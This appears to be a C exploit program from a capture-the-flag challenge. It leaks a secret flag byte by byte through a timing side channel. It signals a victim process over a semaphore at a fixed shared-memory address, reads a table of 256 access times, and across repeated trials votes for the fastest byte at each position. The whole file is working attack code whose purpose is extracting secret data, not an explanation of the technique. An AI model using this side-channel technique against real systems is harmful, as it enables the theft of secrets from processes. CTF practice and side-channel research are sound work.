#include <stdio.h>
#include <stdint.h>
#include <semaphore.h>
#include <unistd.h>
#include <string.h>

#define SHARED_MEM_BASE 0x1337000
#define TIMING_DATA_OFFSET 0x1000
#define NUM_TRIALS 10

int main() {
    sem_t *sem = (sem_t *)SHARED_MEM_BASE;
    int *index = (int *)(sem + 1);
    uint64_t *timing_data = (uint64_t *)(SHARED_MEM_BASE + TIMING_DATA_OFFSET);
    
    char flag[256] = {0};
    
    printf("Starting flag extraction...\n");
    
    for (int pos = 0; pos < 100; pos++) {  // Increased limit
        printf("Extracting position %d...\n", pos);
        
        uint64_t min_times[256];
        int hit_counts[256] = {0};
        
        // Initialize min_times to max value
        for (int i = 0; i < 256; i++) {
            min_times[i] = UINT64_MAX;
        }
        
        // Take multiple measurements
        for (int trial = 0; trial < NUM_TRIALS; trial++) {
            *index = pos;
            sem_post(sem);
            usleep(5000);
            
            // Find the fastest access time this trial
            uint64_t min_time = UINT64_MAX;
            int best_candidate = 0;
            
            for (int i = 0; i < 256; i++) {
                if (timing_data[i] < min_time) {
                    min_time = timing_data[i];
                    best_candidate = i;
                }
                if (timing_data[i] < min_times[i]) {
                    min_times[i] = timing_data[i];
                }
            }
            
            hit_counts[best_candidate]++;
            
            printf("  Trial %d: '%c' (%d) timing: %lu\n", 
                   trial, (best_candidate >= 0x20 && best_candidate <= 0x7e) ? best_candidate : '?', 
                   best_candidate, min_time);
        }
        
        // Find the byte value that was fastest most often
        int best_byte = 0;
        int max_hits = 0;
        uint64_t best_time = UINT64_MAX;
        
        for (int i = 0; i < 256; i++) {
            if (hit_counts[i] > max_hits || 
                (hit_counts[i] == max_hits && min_times[i] < best_time)) {
                max_hits = hit_counts[i];
                best_byte = i;
                best_time = min_times[i];
            }
        }
        
        printf("Position %d: '%c' (%d) [%d hits, min_time: %lu]\n", 
               pos, (best_byte >= 0x20 && best_byte <= 0x7e) ? best_byte : '?', 
               best_byte, max_hits, best_time);
        
        // Check for end conditions first
        if (best_byte == '}' && max_hits >= 3) {
            flag[pos] = best_byte;
            flag[pos + 1] = '\0';
            printf("Found flag end '}' at position %d\n", pos);
            break;
        } else if (best_byte == 0 && max_hits >= 5) {
            // Null byte - end of flag
            flag[pos] = '\0';
            printf("Found null terminator at position %d\n", pos);
            break;
        } else if (max_hits >= 3) {
            flag[pos] = best_byte;
        } else {
            printf("Low confidence (%d hits), skipping position %d\n", max_hits, pos);
            break;
        }
        
        printf("Current flag: %s\n\n", flag);
    }
    
    printf("Final extracted flag: %s\n", flag);
    return 0;
}
